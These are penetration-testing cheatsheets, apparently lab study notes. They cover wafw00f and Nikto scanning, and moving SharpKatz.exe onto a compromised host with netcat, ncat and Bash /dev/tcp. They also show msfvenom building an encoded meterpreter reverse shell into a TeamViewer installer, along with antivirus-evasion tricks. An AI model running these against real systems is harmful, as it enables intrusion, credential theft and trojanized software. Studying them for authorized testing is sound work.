</tbody>
</table>
</div>
<hr>
<h2 id="output-options"><a class="header" href="#output-options">Output Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-v</code></td><td>Verbose output</td></tr>
<tr><td><code>-a</code></td><td>List all WAFs that were tested</td></tr>
<tr><td><code>-r</code></td><td>Follow redirects</td></tr>
<tr><td><code>-V</code></td><td>Version information</td></tr>
<tr><td><code>-h</code></td><td>Show help message</td></tr>
<tr><td><code>-l</code></td><td>List all WAFs that wafw00f can detect</td></tr>
<tr><td><code>-p &lt;port&gt;</code></td><td>Use a different port (default: 80/443)</td></tr>
<tr><td><code>-t &lt;timeout&gt;</code></td><td>Set timeout (default: 10 seconds)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="request-options"><a class="header" href="#request-options">Request Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-H &lt;header&gt;</code></td><td>Add custom header (can be used multiple times)</td></tr>
<tr><td><code>-c &lt;cookie&gt;</code></td><td>Add cookie to request</td></tr>
<tr><td><code>-A &lt;user-agent&gt;</code></td><td>Set custom user agent</td></tr>
<tr><td><code>-m &lt;method&gt;</code></td><td>HTTP method to use (default: GET)</td></tr>
<tr><td><code>-d &lt;data&gt;</code></td><td>POST data</td></tr>
<tr><td><code>-X &lt;method&gt;</code></td><td>HTTP method (GET, POST, PUT, DELETE, etc.)</td></tr>
<tr><td><code>--proxy &lt;proxy&gt;</code></td><td>Use proxy (format: http://host:port)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="advanced-options"><a class="header" href="#advanced-options">Advanced Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-f</code></td><td>Test for false positives</td></tr>
<tr><td><code>--findall</code></td><td>Find all WAFs (don‚Äôt stop at first match)</td></tr>
<tr><td><code>--json</code></td><td>Output in JSON format</td></tr>
<tr><td><code>--xml</code></td><td>Output in XML format</td></tr>
<tr><td><code>--csv</code></td><td>Output in CSV format</td></tr>
<tr><td><code>-o &lt;file&gt;</code></td><td>Output to file</td></tr>
<tr><td><code>--format &lt;format&gt;</code></td><td>Output format (normal, json, xml, csv)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-examples-3"><a class="header" href="#useful-examples-3">Useful Examples</a></h2>
<h3 id="basic-waf-detection"><a class="header" href="#basic-waf-detection">Basic WAF Detection</a></h3>
<pre><code>wafw00f https://example.com
</code></pre>
<h3 id="verbose-output-2"><a class="header" href="#verbose-output-2">Verbose Output</a></h3>
<pre><code>wafw00f -v https://example.com
</code></pre>
<h3 id="list-all-detectable-wafs"><a class="header" href="#list-all-detectable-wafs">List All Detectable WAFs</a></h3>
<pre><code>wafw00f -l
</code></pre>
<h3 id="scan-with-custom-port"><a class="header" href="#scan-with-custom-port">Scan with Custom Port</a></h3>
<pre><code>wafw00f -p 8080 http://example.com
</code></pre>
<h3 id="scan-with-custom-user-agent"><a class="header" href="#scan-with-custom-user-agent">Scan with Custom User Agent</a></h3>
<pre><code>wafw00f -A "Mozilla/5.0" https://example.com
</code></pre>
<h3 id="scan-with-custom-headers"><a class="header" href="#scan-with-custom-headers">Scan with Custom Headers</a></h3>
<pre><code>wafw00f -H "X-Forwarded-For: 127.0.0.1" https://example.com
</code></pre>
<h3 id="scan-with-cookie"><a class="header" href="#scan-with-cookie">Scan with Cookie</a></h3>
<pre><code>wafw00f -c "session=abc123" https://example.com
</code></pre>
<h3 id="scan-through-proxy"><a class="header" href="#scan-through-proxy">Scan Through Proxy</a></h3>
<pre><code>wafw00f --proxy http://127.0.0.1:8080 https://example.com
</code></pre>
<h3 id="post-request-scan"><a class="header" href="#post-request-scan">POST Request Scan</a></h3>
<pre><code>wafw00f -X POST -d "data=test" https://example.com
</code></pre>
<h3 id="find-all-wafs-dont-stop-at-first-match"><a class="header" href="#find-all-wafs-dont-stop-at-first-match">Find All WAFs (Don‚Äôt Stop at First Match)</a></h3>
<pre><code>wafw00f --findall https://example.com
</code></pre>
<h3 id="test-for-false-positives"><a class="header" href="#test-for-false-positives">Test for False Positives</a></h3>
<pre><code>wafw00f -f https://example.com
</code></pre>
<h3 id="json-output"><a class="header" href="#json-output">JSON Output</a></h3>
<pre><code>wafw00f --json https://example.com
</code></pre>
<h3 id="output-to-file"><a class="header" href="#output-to-file">Output to File</a></h3>
<pre><code>wafw00f -o results.txt https://example.com
</code></pre>
<h3 id="follow-redirects"><a class="header" href="#follow-redirects">Follow Redirects</a></h3>
<pre><code>wafw00f -r https://example.com
</code></pre>
<h3 id="comprehensive-scan-with-multiple-options"><a class="header" href="#comprehensive-scan-with-multiple-options">Comprehensive Scan with Multiple Options</a></h3>
<pre><code>wafw00f -v -r -A "Mozilla/5.0" --findall -o results.txt https://example.com
</code></pre>
<h3 id="scan-with-custom-timeout"><a class="header" href="#scan-with-custom-timeout">Scan with Custom Timeout</a></h3>
<pre><code>wafw00f -t 30 https://example.com
</code></pre>
<h3 id="show-all-tested-wafs"><a class="header" href="#show-all-tested-wafs">Show All Tested WAFs</a></h3>
<pre><code>wafw00f -a https://example.com
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nikto-cheatsheet"><a class="header" href="#nikto-cheatsheet">Nikto Cheatsheet</a></h1>
<h2 id="basic-usage-1"><a class="header" href="#basic-usage-1">Basic Usage</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><code>nikto -h &lt;target&gt;</code></td><td>Basic scan of target host</td></tr>
<tr><td><code>nikto -h &lt;target&gt; -p &lt;port&gt;</code></td><td>Scan specific port</td></tr>
<tr><td><code>nikto -h &lt;target&gt; -p &lt;port1,port2&gt;</code></td><td>Scan multiple ports</td></tr>
<tr><td><code>nikto -h &lt;target&gt; -p 80-443</code></td><td>Scan port range</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="output-options-1"><a class="header" href="#output-options-1">Output Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-o &lt;file&gt;</code></td><td>Output to file</td></tr>
<tr><td><code>-Format txt</code></td><td>Text format (default)</td></tr>
<tr><td><code>-Format csv</code></td><td>CSV format</td></tr>
<tr><td><code>-Format htm</code></td><td>HTML format</td></tr>
<tr><td><code>-Format xml</code></td><td>XML format</td></tr>
<tr><td><code>-Format json</code></td><td>JSON format</td></tr>
<tr><td><code>-nossl</code></td><td>Disable SSL checks</td></tr>
<tr><td><code>-no404</code></td><td>Disable 404 checks (faster)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="authentication"><a class="header" href="#authentication">Authentication</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-id &lt;user:pass&gt;</code></td><td>HTTP basic authentication</td></tr>
<tr><td><code>-mutate 1</code></td><td>Guess usernames/passwords</td></tr>
<tr><td><code>-mutate 2</code></td><td>Guess directory names</td></tr>
<tr><td><code>-mutate 3</code></td><td>Guess filenames</td></tr>
<tr><td><code>-mutate 4</code></td><td>Guess usernames from Apache</td></tr>
<tr><td><code>-mutate 5</code></td><td>Guess usernames from cgiwrap</td></tr>
<tr><td><code>-mutate 6</code></td><td>Guess usernames from Windows</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="important-flags-1"><a class="header" href="#important-flags-1">Important Flags</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Flag</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-Cgidirs none</code></td><td>Don‚Äôt scan CGI directories</td></tr>
<tr><td><code>-Cgidirs all</code></td><td>Scan all CGI directories</td></tr>
<tr><td><code>-Display 1</code></td><td>Show redirects</td></tr>
<tr><td><code>-Display 2</code></td><td>Show cookies received</td></tr>
<tr><td><code>-Display 3</code></td><td>Show all 200/404/403 responses</td></tr>
<tr><td><code>-Display 4</code></td><td>Show URLs requiring authentication</td></tr>
<tr><td><code>-Display D</code></td><td>Debug output</td></tr>
<tr><td><code>-Display V</code></td><td>Verbose output</td></tr>
<tr><td><code>-Tuning 1</code></td><td>Interesting files</td></tr>
<tr><td><code>-Tuning 2</code></td><td>Misconfigurations</td></tr>
<tr><td><code>-Tuning 3</code></td><td>Information disclosure</td></tr>
<tr><td><code>-Tuning 4</code></td><td>Injection (XSS/Script/HTML)</td></tr>
<tr><td><code>-Tuning 5</code></td><td>Remote file retrieval</td></tr>
<tr><td><code>-Tuning 6</code></td><td>Denial of service</td></tr>
<tr><td><code>-Tuning 7</code></td><td>Remote file execution</td></tr>
<tr><td><code>-Tuning 8</code></td><td>SQL injection</td></tr>
<tr><td><code>-Tuning 9</code></td><td>File upload</td></tr>
<tr><td><code>-Tuning a</code></td><td>Authentication bypass</td></tr>
<tr><td><code>-Tuning b</code></td><td>Software identification</td></tr>
<tr><td><code>-Tuning c</code></td><td>Remote code execution</td></tr>
<tr><td><code>-Tuning d</code></td><td>Denial of service (DoS)</td></tr>
<tr><td><code>-Tuning e</code></td><td>Denial of service (DoS)</td></tr>
<tr><td><code>-Tuning f</code></td><td>Fingerprinting</td></tr>
<tr><td><code>-Tuning g</code></td><td>SQL injection</td></tr>
<tr><td><code>-Tuning h</code></td><td>Remote file retrieval</td></tr>
<tr><td><code>-Tuning i</code></td><td>Misconfigurations</td></tr>
<tr><td><code>-Tuning j</code></td><td>Information disclosure</td></tr>
<tr><td><code>-Tuning k</code></td><td>File upload</td></tr>
<tr><td><code>-Tuning l</code></td><td>Local file inclusion</td></tr>
<tr><td><code>-Tuning m</code></td><td>Remote file inclusion</td></tr>
<tr><td><code>-Tuning n</code></td><td>Interesting files</td></tr>
<tr><td><code>-Tuning o</code></td><td>OS command injection</td></tr>
<tr><td><code>-Tuning p</code></td><td>Privilege escalation</td></tr>
<tr><td><code>-Tuning q</code></td><td>Remote code execution</td></tr>
<tr><td><code>-Tuning r</code></td><td>Remote file execution</td></tr>
<tr><td><code>-Tuning s</code></td><td>SQL injection</td></tr>
<tr><td><code>-Tuning t</code></td><td>Authentication bypass</td></tr>
<tr><td><code>-Tuning u</code></td><td>Remote file retrieval</td></tr>
<tr><td><code>-Tuning v</code></td><td>XSS</td></tr>
<tr><td><code>-Tuning w</code></td><td>Information disclosure</td></tr>
<tr><td><code>-Tuning x</code></td><td>XSS</td></tr>
<tr><td><code>-Tuning y</code></td><td>XSS</td></tr>
<tr><td><code>-Tuning z</code></td><td>XSS</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="proxy-and-ssl-options"><a class="header" href="#proxy-and-ssl-options">Proxy and SSL Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-useproxy &lt;url&gt;</code></td><td>Use HTTP proxy</td></tr>
<tr><td><code>-ssl</code></td><td>Force SSL mode</td></tr>
<tr><td><code>-nossl</code></td><td>Disable SSL checks</td></tr>
<tr><td><code>-root</code></td><td>Prepend root value to all requests</td></tr>
<tr><td><code>-timeout &lt;seconds&gt;</code></td><td>Request timeout (default 10)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-examples-4"><a class="header" href="#useful-examples-4">Useful Examples</a></h2>
<h3 id="basic-scan"><a class="header" href="#basic-scan">Basic Scan</a></h3>
<pre><code>nikto -h example.com
</code></pre>
<h3 id="scan-specific-port-with-ssl"><a class="header" href="#scan-specific-port-with-ssl">Scan Specific Port with SSL</a></h3>
<pre><code>nikto -h example.com -p 443 -ssl
</code></pre>
<h3 id="scan-with-authentication"><a class="header" href="#scan-with-authentication">Scan with Authentication</a></h3>
<pre><code>nikto -h example.com -id admin:password
</code></pre>
<h3 id="output-to-html-file"><a class="header" href="#output-to-html-file">Output to HTML File</a></h3>
<pre><code>nikto -h example.com -Format htm -o report.html
</code></pre>
<h3 id="scan-with-specific-tuning-sql-injection"><a class="header" href="#scan-with-specific-tuning-sql-injection">Scan with Specific Tuning (SQL Injection)</a></h3>
<pre><code>nikto -h example.com -Tuning 8
</code></pre>
<h3 id="scan-with-multiple-tuning-options"><a class="header" href="#scan-with-multiple-tuning-options">Scan with Multiple Tuning Options</a></h3>
<pre><code>nikto -h example.com -Tuning 3,4,8
</code></pre>
<h3 id="verbose-output-with-redirects"><a class="header" href="#verbose-output-with-redirects">Verbose Output with Redirects</a></h3>
<pre><code>nikto -h example.com -Display V -Display 1
</code></pre>
<h3 id="scan-through-proxy-1"><a class="header" href="#scan-through-proxy-1">Scan Through Proxy</a></h3>
<pre><code>nikto -h example.com -useproxy http://proxy.example.com:8080
</code></pre>
<h3 id="scan-with-custom-user-agent-1"><a class="header" href="#scan-with-custom-user-agent-1">Scan with Custom User Agent</a></h3>
<pre><code>nikto -h example.com -useragent "Mozilla/5.0"
</code></pre>
<h3 id="scan-specific-cgi-directories"><a class="header" href="#scan-specific-cgi-directories">Scan Specific CGI Directories</a></h3>
<pre><code>nikto -h example.com -Cgidirs /cgi-bin/
</code></pre>
<h3 id="scan-with-timeout"><a class="header" href="#scan-with-timeout">Scan with Timeout</a></h3>
<pre><code>nikto -h example.com -timeout 30
</code></pre>
<h3 id="scan-multiple-ports"><a class="header" href="#scan-multiple-ports">Scan Multiple Ports</a></h3>
<pre><code>nikto -h example.com -p 80,443,8080
</code></pre>
<h3 id="scan-with-mutations-directory-guessing"><a class="header" href="#scan-with-mutations-directory-guessing">Scan with Mutations (Directory Guessing)</a></h3>
<pre><code>nikto -h example.com -mutate 2
</code></pre>
<h3 id="comprehensive-scan-with-all-options"><a class="header" href="#comprehensive-scan-with-all-options">Comprehensive Scan with All Options</a></h3>
<pre><code>nikto -h example.com -p 80,443 -ssl -Format htm -o report.html -Display V -Tuning 1,2,3,4,5,6,7,8,9
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="powershell-file-transfer"><a class="header" href="#powershell-file-transfer">PowerShell File Transfer</a></h1>
<p>PowerShell Remoting (WinRM) can be used for file transfer operations when HTTP, HTTPS, or SMB are unavailable.</p>
<h2 id="powershell-remoting-overview"><a class="header" href="#powershell-remoting-overview">PowerShell Remoting Overview</a></h2>
<p>PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations.</p>
<p>By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener:</p>
<ul>
<li><strong>TCP/5985</strong> for HTTP</li>
<li><strong>TCP/5986</strong> for HTTPS</li>
</ul>
<h2 id="requirements"><a class="header" href="#requirements">Requirements</a></h2>
<p>To create a PowerShell Remoting session on a remote computer, you will need:</p>
<ul>
<li>Administrative access, OR</li>
<li>Be a member of the Remote Management Users group, OR</li>
<li>Have explicit permissions for PowerShell Remoting in the session configuration</li>
</ul>
<h2 id="testing-connectivity"><a class="header" href="#testing-connectivity">Testing Connectivity</a></h2>
<p>Test if WinRM port is open:</p>
<pre><code class="language-powershell">Test-NetConnection -ComputerName DATABASE01 -Port 5985
</code></pre>
<h2 id="creating-a-powershell-session"><a class="header" href="#creating-a-powershell-session">Creating a PowerShell Session</a></h2>
<p>Create a PowerShell Remoting session to a remote computer:</p>
<pre><code class="language-powershell">$Session = New-PSSession -ComputerName DATABASE01
</code></pre>
<p>If credentials are needed:</p>
<pre><code class="language-powershell">$Credential = Get-Credential
$Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
</code></pre>
<h2 id="file-transfer-operations"><a class="header" href="#file-transfer-operations">File Transfer Operations</a></h2>
<h3 id="copy-file-to-remote-session"><a class="header" href="#copy-file-to-remote-session">Copy File to Remote Session</a></h3>
<p>Copy a file from localhost to the remote session:</p>
<pre><code class="language-powershell">Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
</code></pre>
<h3 id="copy-file-from-remote-session"><a class="header" href="#copy-file-from-remote-session">Copy File from Remote Session</a></h3>
<p>Copy a file from the remote session to localhost:</p>
<pre><code class="language-powershell">Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
</code></pre>
<h2 id="common-cmdlets"><a class="header" href="#common-cmdlets">Common Cmdlets</a></h2>
<ul>
<li><code>New-PSSession</code>: Create a new PowerShell remoting session</li>
<li><code>Copy-Item</code>: Copy files to/from remote sessions
<ul>
<li><code>-ToSession</code>: Copy to remote session</li>
<li><code>-FromSession</code>: Copy from remote session</li>
</ul>
</li>
<li><code>Test-NetConnection</code>: Test network connectivity to a remote host</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ncat-file-transfer"><a class="header" href="#ncat-file-transfer">Ncat File Transfer</a></h1>
<p>Ncat is a modern reimplementation of Netcat produced by the Nmap Project. It supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.</p>
<p><strong>Note:</strong> Ncat is used in HackTheBox‚Äôs PwnBox as <code>nc</code>, <code>ncat</code>, and <code>netcat</code>.</p>
<h2 id="file-transfer-methods"><a class="header" href="#file-transfer-methods">File Transfer Methods</a></h2>
<h3 id="method-1-compromised-machine-listening"><a class="header" href="#method-1-compromised-machine-listening">Method 1: Compromised Machine Listening</a></h3>
<p><strong>Compromised machine (listening):</strong></p>
<pre><code class="language-bash">ncat -l -p 8000 --recv-only &gt; SharpKatz.exe
</code></pre>
<p>The <code>--recv-only</code> flag closes the connection once the file transfer is finished.</p>
<p><strong>Attack host (sending):</strong></p>
<pre><code class="language-bash">ncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe
</code></pre>
<p>The <code>--send-only</code> flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with <code>--send-only</code>, there is no need to anticipate further incoming information.</p>
<h3 id="method-2-attack-host-listening"><a class="header" href="#method-2-attack-host-listening">Method 2: Attack Host Listening</a></h3>
<p><strong>Attack host (listening):</strong></p>
<pre><code class="language-bash">sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe
</code></pre>
<p><strong>Compromised machine (receiving):</strong></p>
<pre><code class="language-bash">ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe
</code></pre>
<h3 id="method-3-using-bash-devtcp-no-ncat-required"><a class="header" href="#method-3-using-bash-devtcp-no-ncat-required">Method 3: Using Bash /dev/tcp (No Ncat Required)</a></h3>
<p><strong>Attack host (listening):</strong></p>
<pre><code class="language-bash">sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe
</code></pre>
<p><strong>Compromised machine (receiving via /dev/tcp):</strong></p>
<pre><code class="language-bash">cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe
</code></pre>
<h2 id="common-options-1"><a class="header" href="#common-options-1">Common Options</a></h2>
<ul>
<li><code>-l</code>: Listen mode</li>
<li><code>-p &lt;port&gt;</code>: Specify port number</li>
<li><code>--send-only</code>: Close connection once input is exhausted (sending side)</li>
<li><code>--recv-only</code>: Close connection once file transfer is finished (receiving side)</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="netcat-file-transfer"><a class="header" href="#netcat-file-transfer">Netcat File Transfer</a></h1>
<p>Netcat (often abbreviated to <code>nc</code>) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.</p>
<p>The original Netcat was released by Hobbit in 1995, but it hasn‚Äôt been maintained despite its popularity.</p>
<h2 id="file-transfer-methods-1"><a class="header" href="#file-transfer-methods-1">File Transfer Methods</a></h2>
<p>The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.</p>
<h3 id="method-1-compromised-machine-listening-1"><a class="header" href="#method-1-compromised-machine-listening-1">Method 1: Compromised Machine Listening</a></h3>
<p><strong>Compromised machine (listening):</strong></p>
<pre><code class="language-bash">nc -l -p 8000 &gt; SharpKatz.exe
</code></pre>
<p><strong>Attack host (sending):</strong></p>
<pre><code class="language-bash">nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe
</code></pre>
<p>The <code>-q 0</code> option tells Netcat to close the connection once it finishes, so you‚Äôll know when the file transfer was completed.</p>
<h3 id="method-2-attack-host-listening-1"><a class="header" href="#method-2-attack-host-listening-1">Method 2: Attack Host Listening</a></h3>
<p><strong>Attack host (listening):</strong></p>
<pre><code class="language-bash">sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe
</code></pre>
<p><strong>Compromised machine (receiving):</strong></p>
<pre><code class="language-bash">nc 192.168.49.128 443 &gt; SharpKatz.exe
</code></pre>
<p>This method is useful in scenarios where there‚Äôs a firewall blocking inbound connections.</p>
<h3 id="method-3-using-bash-devtcp-no-netcat-required"><a class="header" href="#method-3-using-bash-devtcp-no-netcat-required">Method 3: Using Bash /dev/tcp (No Netcat Required)</a></h3>
<p>If Netcat is not available on the compromised machine, Bash supports read/write operations on a pseudo-device file <code>/dev/TCP/</code>.</p>
<p><strong>Attack host (listening):</strong></p>
<pre><code class="language-bash">sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe
</code></pre>
<p><strong>Compromised machine (receiving via /dev/tcp):</strong></p>
<pre><code class="language-bash">cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe
</code></pre>
<p>Writing to this particular file makes Bash open a TCP connection to <code>host:port</code>, and this feature may be used for file transfers.</p>
<p><strong>Note:</strong> The same operation can be used to transfer files from the compromised host to the attack host.</p>
<h2 id="common-options-2"><a class="header" href="#common-options-2">Common Options</a></h2>
<ul>
<li><code>-l</code>: Listen mode</li>
<li><code>-p &lt;port&gt;</code>: Specify port number</li>
<li><code>-q &lt;seconds&gt;</code>: Wait specified seconds after EOF on stdin, then quit (0 = quit immediately)</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rdp-file-transfer"><a class="header" href="#rdp-file-transfer">RDP File Transfer</a></h1>
<p>RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP through multiple methods.</p>
<h2 id="method-1-copy-and-paste"><a class="header" href="#method-1-copy-and-paste">Method 1: Copy and Paste</a></h2>
<p>The simplest method is copying and pasting files:</p>
<ol>
<li>Right-click and copy a file from the Windows machine you connect to</li>
<li>Paste it into the RDP session</li>
</ol>
<p><strong>Note:</strong> If connecting from Linux using <code>xfreerdp</code> or <code>rdesktop</code>, copy from the target machine to the RDP session may work, but there may be scenarios where this may not work as expected.</p>
<h2 id="method-2-mount-local-folder-linux-to-windows"><a class="header" href="#method-2-mount-local-folder-linux-to-windows">Method 2: Mount Local Folder (Linux to Windows)</a></h2>
<p>As an alternative to copy and paste, we can mount a local resource on the target RDP server.</p>
<h3 id="using-rdesktop"><a class="header" href="#using-rdesktop">Using rdesktop</a></h3>
<p>Mount a Linux folder using <code>rdesktop</code>:</p>
<pre><code class="language-bash">rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
</code></pre>
<h3 id="using-xfreerdp"><a class="header" href="#using-xfreerdp">Using xfreerdp</a></h3>
<p>Mount a Linux folder using <code>xfreerdp</code>:</p>
<pre><code class="language-bash">xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
</code></pre>
<h3 id="accessing-the-mounted-drive"><a class="header" href="#accessing-the-mounted-drive">Accessing the Mounted Drive</a></h3>
<p>To access the directory in the RDP session, connect to <code>\\tsclient\</code>:</p>
<ul>
<li>Navigate to <code>\\tsclient\linux\</code> (or the name you specified)</li>
<li>This allows you to transfer files to and from the RDP session</li>
</ul>
<h2 id="method-3-mount-local-drive-windows-to-windows"><a class="header" href="#method-3-mount-local-drive-windows-to-windows">Method 3: Mount Local Drive (Windows to Windows)</a></h2>
<p>From Windows, use the native <code>mstsc.exe</code> remote desktop client:</p>
<ol>
<li>Open Remote Desktop Connection (<code>mstsc.exe</code>)</li>
<li>Click ‚ÄúShow Options‚Äù</li>
<li>Go to the ‚ÄúLocal Resources‚Äù tab</li>
<li>Click ‚ÄúMore‚Ä¶‚Äù under ‚ÄúLocal devices and resources‚Äù</li>
<li>Expand ‚ÄúDrives‚Äù and select the drive(s) you want to share</li>
<li>Click ‚ÄúOK‚Äù and connect</li>
</ol>
<p>After selecting the drive, you can interact with it in the remote session that follows.</p>
<p><strong>Note:</strong> This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</p>
<h2 id="common-options-3"><a class="header" href="#common-options-3">Common Options</a></h2>
<h3 id="rdesktop"><a class="header" href="#rdesktop">rdesktop</a></h3>
<ul>
<li><code>-d &lt;domain&gt;</code>: Domain name</li>
<li><code>-u &lt;user&gt;</code>: Username</li>
<li><code>-p &lt;password&gt;</code>: Password</li>
<li><code>-r disk:&lt;name&gt;=&lt;path&gt;</code>: Mount local directory as network drive</li>
</ul>
<h3 id="xfreerdp"><a class="header" href="#xfreerdp">xfreerdp</a></h3>
<ul>
<li><code>/v:&lt;host&gt;</code>: Server hostname or IP</li>
<li><code>/d:&lt;domain&gt;</code>: Domain name</li>
<li><code>/u:&lt;user&gt;</code>: Username</li>
<li><code>/p:&lt;password&gt;</code>: Password</li>
<li><code>/drive:&lt;name&gt;,&lt;path&gt;</code>: Mount local directory as network drive</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="msfvenom-cheat-sheet"><a class="header" href="#msfvenom-cheat-sheet">msfvenom cheat sheet</a></h1>
<h2 id="protection-types"><a class="header" href="#protection-types">Protection Types</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>Endpoint Protection</strong></td><td>Localized software protecting single hosts (AV, antimalware, firewall, anti-DDoS)</td></tr>
<tr><td><strong>Perimeter Protection</strong></td><td>Physical/virtual devices on network edge (firewalls, IDS/IPS)</td></tr>
<tr><td><strong>DMZ</strong></td><td>De-Militarized Zone for public-facing servers with moderate trust level</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="detection-methods"><a class="header" href="#detection-methods">Detection Methods</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Method</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>Signature-based</strong></td><td>Pattern matching against known attack signatures (100% match triggers alarm)</td></tr>
<tr><td><strong>Heuristic/Anomaly</strong></td><td>Behavioral comparison against established baseline</td></tr>
<tr><td><strong>Stateful Protocol Analysis</strong></td><td>Comparing protocol events against accepted definitions</td></tr>
<tr><td><strong>SOC Live Monitoring</strong></td><td>Human analysts monitoring network activity in real-time</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="msfvenom-evasion-commands"><a class="header" href="#msfvenom-evasion-commands">msfvenom Evasion Commands</a></h2>
<h3 id="backdoored-executable-template"><a class="header" href="#backdoored-executable-template">Backdoored Executable Template</a></h3>
<pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe -i 5
</code></pre>
<h3 id="key-flags"><a class="header" href="#key-flags">Key Flags</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Flag</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-k</code></td><td>Keep original executable functionality (run payload in separate thread)</td></tr>
<tr><td><code>-x &lt;file&gt;</code></td><td>Use executable as template</td></tr>
<tr><td><code>-e &lt;encoder&gt;</code></td><td>Specify encoder (e.g., <code>x86/shikata_ga_nai</code>)</td></tr>
<tr><td><code>-i &lt;count&gt;</code></td><td>Number of encoding iterations</td></tr>
<tr><td><code>-a &lt;arch&gt;</code></td><td>Architecture (x86, x64)</td></tr>
<tr><td><code>--platform</code></td><td>Target platform (windows, linux)</td></tr>
<tr><td><code>-f &lt;format&gt;</code></td><td>Output format (exe, elf, raw, js, etc.)</td></tr>
<tr><td><code>-o &lt;file&gt;</code></td><td>Output file path</td></tr>
</tbody>
</table>
</div>
<h3 id="generate-encoded-payload"><a class="header" href="#generate-encoded-payload">Generate Encoded Payload</a></h3>
<pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
</code></pre>
<hr>
<h2 id="virustotal-analysis"><a class="header" href="#virustotal-analysis">VirusTotal Analysis</a></h2>
<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f payload.exe
</code></pre>
<hr>
<h2 id="archive-evasion"><a class="header" href="#archive-evasion">Archive Evasion</a></h2>
<p>Password-protected archives bypass many AV signatures but may generate ‚Äúunable to scan‚Äù alerts.</p>
<pre><code class="language-bash"># Create password-protected archive
zip -e -P secretpass payload.zip payload.exe
7z a -pSecretPass payload.7z payload.exe
</code></pre>
<hr>
<h2 id="popular-packers"><a class="header" href="#popular-packers">Popular Packers</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Packer</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>UPX</strong></td><td>Universal executable packer</td></tr>
<tr><td><strong>The Enigma Protector</strong></td><td>Windows executable protection</td></tr>
<tr><td><strong>MPRESS</strong></td><td>PE/ELF/Mach-O packer</td></tr>
<tr><td><strong>Themida</strong></td><td>Advanced code protection</td></tr>
<tr><td><strong>MEW</strong></td><td>Minimal executable packer</td></tr>
